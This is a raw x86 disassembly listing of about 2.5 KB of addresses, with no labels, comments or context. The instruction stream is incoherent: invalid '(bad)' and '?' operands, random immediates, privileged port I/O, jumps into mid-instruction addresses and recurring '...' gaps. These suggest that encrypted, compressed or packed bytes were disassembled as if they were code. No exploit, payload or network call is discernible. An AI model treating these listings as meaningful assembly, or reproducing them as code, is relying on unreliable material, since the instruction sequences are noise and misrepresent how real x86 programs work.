  42c182:	gs ret 
  42c184:	out    0xba,al
  42c186:	mov    edi,DWORD PTR [esi-0x8]
  42c189:	sbb    dl,ah
  42c18b:	lea    esp,[esi]
  42c18d:	ret    
  42c18e:	sahf   
  42c18f:	int    0x23
	...
  42c1f1:	add    BYTE PTR [eax],al
  42c1f3:	add    BYTE PTR [ecx-0x7e],ch
  42c1f6:	int    0xae
  42c1f8:	out    dx,eax
  42c1f9:	out    dx,eax
  42c1fa:	imul   eax,edi,0xfffffff2
  42c1fd:	nop
  42c1fe:	xchg   esp,eax
  42c1ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c200:	mov    dh,0x78
  42c202:	sub    BYTE PTR [esi+eiz*8-0x28],al
  42c206:	add    DWORD PTR [eax],eax
  42c208:	add    eax,0xe0000001
  42c20d:	xchg   ebp,eax
  42c20e:	xchg   ecx,eax
  42c20f:	std    
  42c210:	mov    al,0xaf
  42c212:	into   
  42c213:	push   edi
  42c214:	ja     0x42c26d
  42c216:	adc    al,0x99
  42c218:	sbb    BYTE PTR [esi+0x2e86fd7e],0x11
  42c21f:	xchg   esp,eax
  42c220:	pop    ss
  42c221:	(bad)  
  42c222:	retf   0xfbe6
  42c225:	pop    eax
  42c226:	push   0xc9fb2e3b
  42c22b:	pop    esi
  42c22c:	fbld   TBYTE PTR [ebx-0x41]
  42c22f:	or     BYTE PTR [ecx],ch
  42c231:	fldcw  WORD PTR [ebp+0x2e]
  42c234:	out    0x20,al
  42c236:	mov    edi,0x12acbecb
  42c23b:	pop    ebx
  42c23c:	jbe    0x42c242
  42c23e:	mov    bh,0x21
  42c240:	or     edx,DWORD PTR [ecx]
  42c242:	push   ss
  42c243:	arpl   WORD PTR [edx-0x14],bp
  42c246:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c247:	dec    esp
  42c248:	xchg   BYTE PTR [ebp+0x483d9e68],cl
  42c24e:	lods   al,BYTE PTR ds:[esi]
  42c24f:	sbb    ecx,edx
  42c251:	dec    eax
  42c252:	pop    ss
  42c253:	jae    0x42c1dd
  42c255:	mov    bh,0x86
  42c257:	and    ebx,DWORD PTR ds:0xb3d2c4a
  42c25d:	xchg   BYTE PTR ss:[edx+0x28d50da],bh
  42c264:	xor    BYTE PTR [esi+0x56],cl
  42c267:	adc    BYTE PTR [ebp+0x1152f7ad],bl
  42c26d:	sbb    ecx,ebp
  42c26f:	es pop eax
  42c271:	xlat   BYTE PTR ds:[ebx]
  42c272:	pop    ecx
  42c273:	jne    0x42c230
  42c275:	fnsave [edx]
  42c277:	push   ds
  42c278:	or     BYTE PTR [ebx-0x42c9ccd5],al
  42c27e:	and    esi,DWORD PTR [edi+0x2b]
  42c281:	rcl    DWORD PTR [esi-0x12],0x13
  42c285:	xchg   ecx,eax
  42c286:	lahf   
  42c287:	lods   eax,DWORD PTR ds:[esi]
  42c288:	xchg   esp,eax
  42c289:	test   al,0xe2
  42c28b:	ror    BYTE PTR [ebp+0x77f04d5d],cl
  42c291:	mov    eax,ds:0x5b775c68
  42c296:	cmp    BYTE PTR [ecx+eax*1-0x5],dh
  42c29a:	shl    ch,0x90
  42c29d:	call   0xe7088014
  42c2a2:	mov    esp,0xeae603af
  42c2a7:	dec    edx
  42c2a8:	sbb    DWORD PTR [ebp-0xa],eax
  42c2ab:	data16 add BYTE PTR [eax+eax*2],bh
  42c2af:	pop    ss
  42c2b0:	lods   eax,DWORD PTR ds:[esi]
  42c2b1:	push   ebx
  42c2b2:	add    ebp,esp
  42c2b4:	sub    ebx,DWORD PTR [edi+0x20]
  42c2b7:	xchg   edx,eax
  42c2b8:	dec    esp
  42c2b9:	mov    al,ds:0x18d2fc3c
  42c2be:	mov    ebp,0x20e2f7bd
  42c2c3:	jmp    0x42c29f
  42c2c5:	mov    DWORD PTR [edx],eax
  42c2c7:	scas   al,BYTE PTR es:[edi]
  42c2c8:	pop    ds
  42c2c9:	in     eax,dx
  42c2ca:	and    eax,0xa4bbeda3
  42c2cf:	sub    eax,0x7393edb2
  42c2d4:	(bad)  ds:0xb2bdaf6e
  42c2da:	adc    al,0x5c
  42c2dc:	add    BYTE PTR [edi-0x729401c5],dh
  42c2e2:	or     al,0x8e
  42c2e4:	jne    0x42c2b4
  42c2e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c2e7:	les    edi,FWORD PTR [ebx]
  42c2e9:	mov    bh,0xe6
  42c2eb:	mov    edx,0x6aa9813a
  42c2f0:	mov    ah,0x24
  42c2f2:	popa   
  42c2f3:	add    al,0xe2
  42c2f5:	push   ss
  42c2f6:	jle    0x42c2cb
  42c2f8:	dec    esi
  42c2f9:	sbb    BYTE PTR [esi+0x28985ac9],bl
  42c2ff:	pop    ss
  42c300:	push   esi
  42c301:	imul   edi,DWORD PTR [esi],0xbcfbb46
  42c307:	jmp    0x42c2c0
  42c309:	nop
  42c30a:	adc    ah,bh
  42c30c:	mov    bl,0x1f
  42c30e:	xchg   ebx,eax
  42c30f:	cwde   
  42c310:	push   edi
	...
  42c371:	add    BYTE PTR [eax],al
  42c373:	add    dh,ah
  42c375:	psubusw mm5,QWORD PTR [ebp-0x7]
  42c379:	push   esi
  42c37b:	(bad)  
  42c37c:	in     eax,dx
  42c37d:	(bad)  
  42c37e:	sub    eax,0x9690b9f6
  42c383:	pop    ecx
  42c384:	jmp    0x42c35f
  42c386:	add    DWORD PTR [eax],eax
  42c388:	add    eax,0xc8000001
  42c38d:	pop    esp
  42c38e:	dec    edi
  42c38f:	and    eax,0x35b5bf8f
  42c394:	popf   
  42c395:	push   esi
  42c396:	in     eax,dx
  42c397:	in     eax,dx
  42c398:	test   eax,0xd96f7d06
  42c39d:	cwde   
  42c39e:	sub    DWORD PTR [esi-0x66544d88],0xffffffbb
  42c3a5:	inc    DWORD PTR [esi+0x62]
  42c3a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c3a9:	ficomp WORD PTR [ebp-0x395b1725]
  42c3af:	mov    cl,0xf6
  42c3b1:	inc    ebx
  42c3b2:	xchg   BYTE PTR [ecx+0x4cd4bd47],bl
  42c3b8:	nop
  42c3b9:	xor    DWORD PTR [esi+0x0],edi
  42c3bc:	pop    ecx
  42c3bd:	or     eax,0xd748798
  42c3c2:	adc    eax,0xf057b428
  42c3c7:	scas   al,BYTE PTR es:[edi]
  42c3c8:	stos   BYTE PTR es:[edi],al
  42c3c9:	mov    ah,0xce
  42c3cb:	stc    
  42c3cc:	aad    0x95
  42c3ce:	xchg   edi,eax
  42c3cf:	mov    ecx,0x81a4373b
  42c3d4:	mul    dh
  42c3d6:	test   DWORD PTR [esi+ecx*4+0x10f3b46e],ebp
  42c3dd:	fmul   st,st(4)
  42c3df:	push   edi
  42c3e0:	adc    eax,0xe84d1e4d
  42c3e5:	cmp    al,0xa8
  42c3e7:	mul    BYTE PTR ds:0x3003abb0
  42c3ed:	xor    eax,0x9796537a
  42c3f2:	mov    bh,0x5c
  42c3f4:	cdq    
  42c3f5:	lock inc esp
  42c3f7:	rol    DWORD PTR [eax],1
  42c3f9:	stos   DWORD PTR es:[edi],eax
  42c3fa:	stos   DWORD PTR es:[edi],eax
  42c3fb:	dec    esi
  42c3fc:	sub    BYTE PTR [esi],dl
  42c3fe:	je     0x42c41f
  42c400:	sub    eax,0xee2054c1
  42c405:	mov    BYTE PTR [edi],dl
  42c407:	push   ds
  42c408:	sub    edi,DWORD PTR [eax-0x2a327168]
  42c40e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c40f:	push   eax
  42c410:	sbb    ah,0x4b
  42c413:	mov    eax,ds:0x2d693eea
  42c418:	cwde   
  42c419:	in     al,0x1d
  42c41b:	lahf   
  42c41c:	push   eax
  42c41d:	xchg   ebx,eax
  42c41e:	jns    0x42c3fc
  42c420:	in     eax,0xa9
  42c422:	dec    edx
  42c423:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c424:	push   ebp
  42c425:	out    0xcb,eax
  42c427:	push   edi
  42c428:	call   0x7b4ae888
  42c42d:	mov    al,ds:0x10ad0b16
  42c432:	aad    0x8a
  42c434:	adc    al,0x47
  42c436:	hlt    
  42c437:	push   0xffffffdf
  42c439:	dec    esi
  42c43a:	test   eax,0x396205e9
  42c43f:	push   ebx
  42c440:	daa    
  42c441:	adc    BYTE PTR [ecx],bh
  42c443:	xor    edi,DWORD PTR [esp-0xf43c9a0]
  42c44a:	gs retf 0xfd14
  42c44e:	jge    0x42c460
  42c450:	add    eax,0x99a551ea
  42c455:	daa    
  42c456:	push   esp
  42c457:	push   esp
  42c458:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c459:	push   edx
  42c45a:	lds    esp,FWORD PTR [edi]
  42c45c:	inc    eax
  42c45d:	dec    edx
  42c45e:	mov    WORD PTR [ecx+0x2d],ds
  42c461:	fcmovu st,st(0)
  42c463:	adc    esp,ebp
  42c465:	nop
  42c466:	mov    eax,0xaa4a9345
  42c46b:	xchg   edx,eax
  42c46c:	inc    eax
  42c46d:	add    al,0xa0
  42c46f:	xchg   DWORD PTR [edx],esp
  42c471:	shl    esp,1
  42c473:	pop    ds
  42c474:	jnp    0x42c424
  42c476:	cmc    
  42c477:	pop    es
  42c478:	add    al,0xf0
  42c47a:	sub    al,0x3
  42c47c:	pop    DWORD PTR [edi+0x3c]
  42c47f:	pop    ds
  42c480:	out    0x95,al
  42c482:	lds    ebp,FWORD PTR [esi-0x548a9fc7]
  42c488:	mov    ecx,0x88c6f7a2
  42c48d:	push   0x1b
  42c48f:	pop    ss
  42c490:	add    BYTE PTR fs:[eax],al
	...
  42c4f3:	add    ah,ch
  42c4f5:	sbb    ebp,edx
  42c4f7:	sahf   
  42c4f8:	cmc    
  42c4f9:	fsubp  st(7),st
  42c4fb:	jnp    0x42c4af
  42c4fd:	sti    
  42c4fe:	enter  0x8634,0xe3
  42c502:	xchg   ecx,eax
  42c503:	daa    
  42c504:	lock fiadd DWORD PTR [ecx]
  42c507:	add    BYTE PTR ds:0x2f000001,al
  42c50d:	out    dx,al
  42c50e:	mov    ?,WORD PTR [edi-0x78af9cbe]
  42c514:	pop    esp
  42c515:	retf   
  42c516:	and    al,0xfd
  42c518:	dec    edi
  42c519:	push   0xcd6df191
  42c51e:	inc    ch
  42c520:	cmp    dl,cl
  42c522:	das    
  42c523:	jg     0x42c4d2
  42c525:	sub    al,0xaf
  42c527:	sar    DWORD PTR [ebx*1-0x14b06798],1
  42c52e:	mov    dl,0x1f
  42c530:	pop    esi
  42c531:	fcom   QWORD PTR [edx+0x4b3e1ff]
  42c537:	mov    WORD PTR [edx+edi*2],cs
  42c53a:	pusha  
  42c53b:	pop    ebx
  42c53c:	(bad)  
  42c53d:	(bad)  [edi+0x7f9d3414]
  42c543:	das    
  42c544:	fistp  WORD PTR [ebp+edx*2+0x3c]
  42c548:	(bad)  
  42c549:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c54a:	mov    WORD PTR [ebp-0x27a6b66c],es
  42c550:	pop    esp
  42c551:	mov    ecx,DWORD PTR [eax+0x2d]
  42c554:	ja     0x42c4de
  42c556:	xor    BYTE PTR [edx],0xa6
  42c559:	mov    edi,0x29e11d9e
  42c55e:	out    0x8,eax
  42c560:	mov    BYTE PTR [ebx+0x1d],bl
  42c563:	ja     0x42c519
  42c565:	outs   dx,DWORD PTR ds:[esi]
  42c566:	dec    ecx
  42c567:	xor    ecx,DWORD PTR [ecx-0x1a0bfa41]
  42c56d:	je     0x42c5e4
  42c56f:	mov    fs,WORD PTR ss:[eax]
  42c572:	mov    dh,0x4
  42c574:	in     eax,0x88
  42c576:	fwait
  42c577:	lea    ebx,[ebp+0x70]
  42c57a:	addr16 loop 0x42c518
  42c57d:	out    0xda,al
  42c57f:	sti    
  42c580:	adc    dl,bh
  42c582:	xchg   edx,eax
  42c583:	(bad)  
  42c585:	cs jno 0x42c564
  42c588:	lds    ecx,FWORD PTR [ecx-0x3bb31209]
  42c58e:	pop    esi
  42c58f:	cdq    
  42c590:	rol    BYTE PTR [eax],1
  42c592:	mov    ah,0xe6
  42c594:	adc    eax,0xe72afa7f
  42c599:	pop    esi
  42c59a:	jmp    0x42c5fa
  42c59c:	mov    WORD PTR [eax+0x336f1dfe],ss
  42c5a2:	push   esp
  42c5a3:	pop    ebp
  42c5a4:	mov    edx,0x23491ac5
  42c5a9:	xchg   esp,eax
  42c5aa:	test   bl,al
  42c5ac:	push   es
  42c5ad:	adc    al,0xc5
  42c5af:	adc    BYTE PTR [ecx-0x6abd852a],0x8b
  42c5b6:	inc    eax
  42c5b7:	push   cs
  42c5b8:	mov    DWORD PTR [ecx+0x2e],0xc32bfba1
  42c5bf:	stos   DWORD PTR es:[edi],eax
  42c5c0:	sub    eax,0xf952bb0f
  42c5c5:	es mov dl,0x82
  42c5c8:	xchg   ebx,eax
  42c5c9:	cmp    dh,0xb9
  42c5cc:	and    esi,edx
  42c5ce:	int    0x84
  42c5d0:	inc    esp
  42c5d1:	jge    0x42c629
  42c5d3:	outs   dx,DWORD PTR ds:[esi]
  42c5d4:	in     al,dx
  42c5d5:	mov    edi,0x7fcb2307
  42c5da:	dec    BYTE PTR [edi+edi*4+0x623bd71]
  42c5e1:	xor    al,0x72
  42c5e3:	clc    
  42c5e4:	dec    ebx
  42c5e5:	mov    DWORD PTR [edx],eax
  42c5e7:	mov    edx,DWORD PTR [bx+si]
  42c5ea:	push   cs
  42c5eb:	mov    ebx,0x22fd669d
  42c5f0:	xlat   BYTE PTR ds:[ebx]
  42c5f1:	adc    esp,DWORD PTR [ebx+0x78]
  42c5f4:	int3   
  42c5f5:	sub    ch,cl
  42c5f7:	mov    al,0x17
  42c5f9:	(bad)  
  42c5fa:	lods   al,BYTE PTR ds:[esi]
  42c5fb:	inc    eax
  42c5fc:	lea    ecx,[esi-0x6dc5f844]
  42c602:	xchg   ebp,eax
  42c603:	hlt    
  42c604:	cli    
  42c605:	xor    eax,0x42555d4e
  42c60a:	cld    
  42c60b:	pushf  
  42c60c:	mov    esi,0xc3a3d22a
	...
  42c671:	add    BYTE PTR [eax],al
  42c673:	add    BYTE PTR [ebp+0x48],bl
  42c676:	jle    0x42c606
  42c678:	jg     0x42c638
  42c67a:	std    
  42c67b:	fstp   TBYTE PTR [ebx+0x7d6dfc6b]
  42c681:	std    
  42c682:	jp     0x42c697
  42c684:	cmc    
  42c685:	fild   DWORD PTR [ecx]
  42c687:	add    BYTE PTR ds:0x45000001,al
  42c68d:	push   ebx
  42c68e:	fs jge 0x42c680
  42c691:	retf   0x4773
  42c694:	stc    
  42c695:	push   ss
  42c696:	push   cs
  42c697:	mov    ch,0xa6
  42c699:	and    al,0x86
  42c69b:	adc    al,0x8b
  42c69d:	aad    0x9d
  42c69f:	inc    edi
  42c6a0:	mov    es,eax
  42c6a2:	aas    
  42c6a3:	cmp    esi,DWORD PTR [eax-0x47]
  42c6a6:	pop    edi
  42c6a7:	dec    edx
  42c6a8:	popa   
  42c6a9:	sti    
  42c6aa:	sbb    dl,BYTE PTR [edi+0x6]
  42c6ad:	add    BYTE PTR [eax+0x5a],bl
  42c6b0:	test   ecx,eax
  42c6b2:	iret   
  42c6b3:	push   ebp
  42c6b4:	mov    ebx,0x7713dba6
  42c6b9:	(bad)  
  42c6ba:	(bad)  
  42c6bb:	out    0x14,al
  42c6bd:	xchg   ecx,eax
  42c6be:	loop   0x42c68f
  42c6c0:	pop    esp
  42c6c1:	mov    ecx,0x66f5869d
  42c6c6:	js     0x42c67d
  42c6c8:	adc    eax,0x279f8edf
  42c6cd:	jmp    0x9c19:0x4fd5058d
  42c6d4:	pusha  
  42c6d5:	inc    ebx
  42c6d6:	xchg   edx,eax
  42c6d7:	push   0x86cd0da8
  42c6dc:	dec    esp
  42c6dd:	sti    
  42c6de:	icebp  
  42c6df:	and    BYTE PTR [ebp-0x2b],dh
  42c6e2:	pop    ebx
  42c6e3:	jp     0x42c704
  42c6e5:	ja     0x42c6a0
  42c6e7:	repnz sub ebp,ebx
  42c6ea:	out    0x3,eax
  42c6ec:	loopne 0x42c6c7
  42c6ee:	adc    edi,DWORD PTR [edi-0x3a22216b]
  42c6f4:	daa    
  42c6f5:	repz daa 
  42c6f7:	add    cl,BYTE PTR [eax]
  42c6f9:	stos   BYTE PTR es:[edi],al
  42c6fa:	add    ecx,ebp
  42c6fc:	loopne 0x42c6ec
  42c6fe:	int    0xf1
  42c700:	and    eax,0x99c1b6d8
  42c705:	mov    DWORD PTR [ecx-0x547a1bd],esi
  42c70b:	sbb    DWORD PTR [ebx+eax*2+0x46],edx
  42c70f:	mov    ds:0x27a293f8,al
  42c714:	ins    DWORD PTR es:[edi],dx
  42c715:	in     al,dx
  42c716:	sbb    BYTE PTR [ebp+0x2],al
  42c719:	lahf   
  42c71a:	add    esi,DWORD PTR [ebx-0x50]
  42c71d:	adc    BYTE PTR [eax-0x6a],0x4e
  42c721:	jg     0x42c79b
  42c723:	dec    esi
  42c724:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c725:	fbld   TBYTE PTR [ecx-0x2b]
  42c728:	pop    DWORD PTR [esp+edi*2]
  42c72b:	lahf   
  42c72c:	(bad)  
  42c72d:	fbstp  TBYTE PTR [ebp-0x9ad562e]
  42c733:	not    ch
  42c735:	paddq  mm7,mm2
  42c738:	lods   al,BYTE PTR ds:[esi]
  42c739:	(bad)  
  42c73a:	sti    
  42c73b:	or     al,0xf2
  42c73d:	mov    BYTE PTR [ebx-0x26],bh
  42c740:	mov    ch,0xd6
  42c742:	loope  0x42c725
  42c744:	xor    DWORD PTR [edx+0x1567ee68],ecx
  42c74a:	ss cli 
  42c74c:	das    
  42c74d:	sub    al,0x9b
  42c74f:	cmp    eax,0xfbe0ce90
  42c754:	mov    ah,0x3e
  42c756:	or     eax,0xc8e88ef5
  42c75b:	imul   ecx,DWORD PTR [edx+0x6407a416],0x573deac6
  42c765:	and    eax,0x35ece18b
  42c76a:	fistp  DWORD PTR [edi-0x79]
  42c76d:	sub    bh,dl
  42c76f:	add    dl,BYTE PTR [esi-0x431f636d]
  42c775:	mov    eax,0x14ab35e8
  42c77a:	mov    bl,0xa
  42c77c:	adc    ebp,DWORD PTR [edx+0x1fe899f1]
  42c782:	xlat   BYTE PTR ds:[ebx]
  42c783:	mov    dl,0x6a
  42c785:	or     DWORD PTR [eax+0x7a],ebx
  42c788:	test   BYTE PTR [edi],0xa1
  42c78b:	jo     0x42c76e
  42c78d:	aad    0xa5
  42c78f:	cmp    ah,0x0
	...
  42c7f2:	add    BYTE PTR [eax],al
  42c7f4:	cmp    BYTE PTR [ecx-0x8046a96],cl
  42c7fa:	jmp    FWORD PTR [ebp-0x5bf1e2a3]
  42c800:	mov    edi,0xfab23a7b
  42c805:	fadd   QWORD PTR [ecx]
  42c807:	add    BYTE PTR ds:0x8e000001,al
  42c80d:	pusha  
  42c80e:	dec    edx
  42c80f:	push   edx
  42c810:	mov    ebx,0xb06a7442
  42c815:	mov    ebp,0x9a125fd2
  42c81a:	int3   
  42c81b:	push   bx
  42c81d:	jecxz  0x42c893
  42c81f:	or     al,0xe9
  42c821:	iret   
  42c822:	jmp    0x42c7a5
  42c824:	call   0xb11f:0x374c2596
  42c82b:	iret   
  42c82c:	inc    BYTE PTR [ecx+0x4b]
  42c82f:	jns    0x42c7d2
  42c831:	inc    edx
  42c832:	lods   al,BYTE PTR ds:[esi]
  42c833:	jmp    0x42c843
  42c835:	(bad)  
  42c836:	enter  0x9ab2,0xc1
  42c83a:	xchg   esi,eax
  42c83b:	jmp    0x42c7bf
  42c83d:	in     eax,dx
  42c83e:	cmp    dl,BYTE PTR [edx-0x3e]
  42c841:	pop    eax
  42c842:	cmp    cl,bh
  42c844:	call   0x33e27661
  42c849:	jo     0x42c87a
  42c84b:	xor    al,0xa9
  42c84d:	mov    dl,0x24
  42c84f:	inc    eax
  42c850:	mov    ds:0x1f055e60,al
  42c855:	icebp  
  42c856:	outs   dx,BYTE PTR ds:[esi]
  42c857:	mov    edx,0xba345aa2
  42c85c:	int3   
  42c85d:	fnstenv [ecx-0x71]
  42c860:	adc    al,0x8e
  42c862:	adc    esi,DWORD PTR [ecx]
  42c864:	push   ss
  42c865:	jl     0x42c859
  42c867:	out    dx,eax
  42c868:	add    ecx,ebp
  42c86a:	jmp    0x6fb44270
  42c86f:	mov    DWORD PTR [eax],ebx
  42c871:	jns    0x42c80f
  42c873:	pop    edx
  42c874:	repz (bad) 
  42c876:	outs   dx,DWORD PTR ds:[esi]
  42c877:	fiadd  DWORD PTR [eax+0x273b265c]
  42c87d:	loope  0x42c880
  42c87f:	test   eax,0x16f90924
  42c884:	inc    esi
  42c885:	rcr    BYTE PTR [edx+ecx*1],0x73
  42c889:	mov    al,ds:0x776ce750
  42c88e:	push   ebx
  42c88f:	arpl   WORD PTR [edx],ax
  42c891:	cli    
  42c892:	mov    ds:0xb8b8540d,eax
  42c897:	maskmovq mm4,(bad)
  42c898:	mul    DWORD PTR [edi+0x6c]
  42c89b:	bound  eax,QWORD PTR [eax+0x61]
  42c89e:	out    dx,eax
  42c89f:	xor    ebp,DWORD PTR [ebp-0x7d60372e]
  42c8a5:	sub    al,dl
  42c8a7:	xor    DWORD PTR [esi+0x321dcb24],edx
  42c8ad:	cmp    eax,0xde216bb3
  42c8b2:	add    BYTE PTR [ecx+0x4d0de5f4],cl
  42c8b8:	scas   al,BYTE PTR es:[edi]
  42c8b9:	retf   0x8e77
  42c8bc:	mov    dh,0x6d
  42c8be:	add    esi,edx
  42c8c0:	sbb    al,0xef
  42c8c2:	and    DWORD PTR [eax],edx
  42c8c4:	fdivr  QWORD PTR [ebp+0x91187af]
  42c8ca:	xchg   ebx,eax
  42c8cb:	push   ebp
  42c8cc:	inc    edx
  42c8cd:	adc    al,BYTE PTR [edi+esi*8-0x3c]
  42c8d1:	mov    cl,0x9d
  42c8d3:	cmp    BYTE PTR [edx+0x6f0bbc6f],ah
  42c8d9:	cld    
  42c8da:	sbb    ecx,DWORD PTR [edx]
  42c8dc:	mov    cl,BYTE PTR [esi]
  42c8de:	push   ebx
  42c8df:	sbb    dh,BYTE PTR [ebx]
  42c8e1:	dec    ecx
  42c8e2:	hlt    
  42c8e3:	int    0x97
  42c8e5:	popf   
  42c8e6:	dec    ebx
  42c8e7:	fcmovu st,st(7)
  42c8e9:	call   DWORD PTR [eax]
  42c8eb:	mov    eax,ds:0x350ee4fa
  42c8f0:	inc    esp
  42c8f1:	cmp    bl,BYTE PTR [ecx-0x23]
  42c8f4:	mov    edx,0xb376e34e
  42c8f9:	popf   
  42c8fa:	out    0x7b,al
  42c8fc:	int3   
  42c8fd:	or     BYTE PTR [esi],dl
  42c8ff:	outs   dx,BYTE PTR ds:[esi]
  42c900:	fistp  QWORD PTR [ebp-0x5f]
  42c903:	jl     0x42c950
  42c905:	jns    0x42c8a7
  42c907:	pop    ss
  42c908:	fsubrp st(3),st
  42c90a:	xor    esi,esp
  42c90c:	jmp    0x42c90f
  42c90e:	cs cbw 
	...
  42c971:	add    BYTE PTR [eax],al
  42c973:	add    BYTE PTR [eax],dl
  42c975:	sbb    ecx,ecx
  42c977:	jmp    0xfb73c547
  42c97c:	(bad)  
  42c97d:	scas   eax,DWORD PTR es:[edi]
  42c97e:	inc    edi
  42c97f:	call   0xb05e82e2
  42c984:	(bad)  
  42c985:	fld    QWORD PTR [ecx]
  42c987:	add    BYTE PTR ds:0xa3000001,al
  42c98d:	shr    DWORD PTR [eax-0x27e9c445],cl
  42c993:	stos   BYTE PTR es:[edi],al
  42c994:	ja     0x42c95b
  42c996:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c997:	mov    ecx,0x1357c185
  42c99c:	hlt    
  42c99d:	xor    edi,DWORD PTR [eax+0x1c5dc52]
  42c9a3:	cmp    cl,cl
  42c9a5:	mov    bl,0xa5
  42c9a7:	test   BYTE PTR [ebx+0x6ef04ca8],bh
  42c9ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c9ae:	ins    DWORD PTR es:[edi],dx
  42c9af:	pushf  
  42c9b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c9b1:	fs mov eax,0x8e422ae
  42c9b7:	jbe    0x42c965
  42c9b9:	outs   dx,BYTE PTR ds:[esi]
  42c9ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c9bb:	out    0x7e,eax
  42c9bd:	push   ecx
  42c9be:	cs push es
  42c9c0:	out    0xe1,al
  42c9c2:	pop    eax
  42c9c3:	mov    ah,0x11
  42c9c5:	dec    esp
  42c9c6:	mov    WORD PTR [ebp-0x333c02c1],?
  42c9cc:	out    dx,eax
  42c9cd:	stos   DWORD PTR es:[edi],eax
  42c9ce:	pop    esi
  42c9cf:	mov    WORD PTR fs:[ebp-0x38],fs
  42c9d3:	mov    cs,WORD PTR ds:0xb250c076
  42c9d9:	fcmovbe st,st(2)
  42c9db:	adc    al,0xbc
  42c9dd:	sbb    DWORD PTR [ebp+ebx*1-0x8],ebx
  42c9e1:	arpl   WORD PTR [esi-0x113638e4],bx
  42c9e7:	test   ch,al
  42c9e9:	mov    DWORD PTR [ebp+ecx*4+0x9e9546f],ebp
  42c9f0:	inc    esp
  42c9f1:	jbe    0x42c9ca
  42c9f3:	test   BYTE PTR ds:0xdc0c6314,al
  42c9f9:	fidivr WORD PTR [ebp+0x2c]
  42c9fc:	pop    ebp
  42c9fd:	imul   esi,DWORD PTR [ebp-0x3f231faf],0xffffffad
  42ca04:	aas    
  42ca05:	pop    ebp
  42ca06:	push   esi
  42ca07:	pop    esp
  42ca08:	and    eax,0xe52e42ba
  42ca0d:	mov    bh,0x5
  42ca0f:	push   ebp
  42ca10:	out    0x54,eax
  42ca12:	cmp    DWORD PTR [ecx-0x24],ebp
  42ca15:	ret    0x96e8
  42ca18:	mov    ah,0xc5
  42ca1a:	push   esi
  42ca1b:	push   0x798b1f96
  42ca20:	mov    eax,0xcd6755a5
  42ca25:	outs   dx,BYTE PTR ds:[esi]
  42ca26:	iret   
  42ca27:	pop    edi
  42ca28:	pushf  
  42ca29:	adc    al,0x7a
  42ca2b:	and    DWORD PTR [edx+edx*2-0x5d],0xffffffdf
  42ca30:	xchg   ebp,eax
  42ca31:	sub    DWORD PTR [ebx+eiz*2-0x71],ecx
  42ca35:	xchg   edx,eax
  42ca36:	push   eax
  42ca37:	shr    DWORD PTR [edx+0x34],1
  42ca3a:	mov    esi,DWORD PTR [ecx+0x49b3233d]
  42ca40:	shl    DWORD PTR [eax],0x6
  42ca43:	jbe    0x42caa4
  42ca45:	scas   eax,DWORD PTR es:[edi]
  42ca46:	adc    BYTE PTR [edi+0x183b60d6],0x47
  42ca4d:	mov    ecx,0xd7b8277f
  42ca52:	je     0x42c9f4
  42ca54:	mov    cl,0x2b
  42ca56:	inc    edi
  42ca57:	jns    0x42ca21
  42ca59:	sbb    DWORD PTR [edx+0x3e31d773],ecx
  42ca5f:	cmp    bl,BYTE PTR cs:[esi]
  42ca62:	jb     0x42c9e7
  42ca64:	repz jl 0x42ca8e
  42ca67:	popa   
  42ca68:	push   esp
  42ca69:	in     eax,dx
  42ca6a:	js     0x42cab5
  42ca6c:	add    DWORD PTR [edx],ebp
  42ca6e:	loopne 0x42ca1c
  42ca70:	pop    edi
  42ca71:	adc    al,0xc1
  42ca73:	xor    ch,BYTE PTR [eax]
  42ca75:	ds add al,ah
  42ca78:	sub    eax,0x9e4564f0
  42ca7d:	push   ss
  42ca7e:	out    0xdb,eax
  42ca80:	cmp    ah,bh
  42ca82:	(bad)  
  42ca83:	push   ecx
  42ca84:	mov    eax,ds:0xa5239ddb
  42ca89:	imul   esp,DWORD PTR [edi+edi*1],0xffffffcd
  42ca8d:	xchg   ebx,eax
  42ca8e:	cmp    ebp,DWORD PTR [eax+0xf7]
	...
  42caf4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42caf5:	fimul  DWORD PTR [eax-0x10ac02bf]
  42cafb:	(bad)  
  42cafc:	fadd   QWORD PTR [ebp-0xc959140]
  42cb02:	outs   dx,BYTE PTR ds:[esi]
  42cb03:	cld    
  42cb04:	add    al,0xdf
  42cb06:	add    DWORD PTR [eax],eax
  42cb08:	add    eax,0x70000001
  42cb0d:	in     al,0xb1
  42cb0f:	mov    al,ds:0xd848c7b1
  42cb14:	adc    ecx,edi
  42cb16:	repnz mov dh,0x40
  42cb19:	sbb    BYTE PTR [ecx],cl
  42cb1b:	ret    0x5f7b
  42cb1e:	add    BYTE PTR [esi+edx*1+0x0],ah
  42cb22:	xchg   ebx,eax
  42cb23:	mov    bh,0x5
  42cb25:	mov    ecx,0xeabb4e7
  42cb2a:	inc    eax
  42cb2b:	iret   
  42cb2c:	imul   ebp,esp,0xaf5271ab
  42cb32:	arpl   dx,si
  42cb34:	lods   eax,DWORD PTR ds:[esi]
  42cb35:	or     eax,0xfd0bf83b
  42cb3a:	cmc    
  42cb3b:	xchg   esi,eax
  42cb3c:	xchg   ebx,eax
  42cb3d:	pop    esi
  42cb3e:	(bad)
  42cb41:	pop    edi
  42cb42:	pop    eax
  42cb43:	cwde   
  42cb44:	jae    0x42cb88
  42cb46:	jbe    0x42caf8
  42cb48:	jne    0x42cb42
  42cb4a:	fldln2 
  42cb4c:	lods   al,BYTE PTR ds:[esi]
  42cb4d:	sar    cl,1
  42cb4f:	stc    
  42cb50:	(bad)  
  42cb51:	sbb    eax,0xc4a19baf
  42cb56:	or     eax,DWORD PTR [esi+0x69c6f9a9]
  42cb5c:	js     0x42cba1
  42cb5e:	pop    ebp
  42cb5f:	(bad)  
  42cb61:	arpl   WORD PTR ds:0x2c68da6c,si
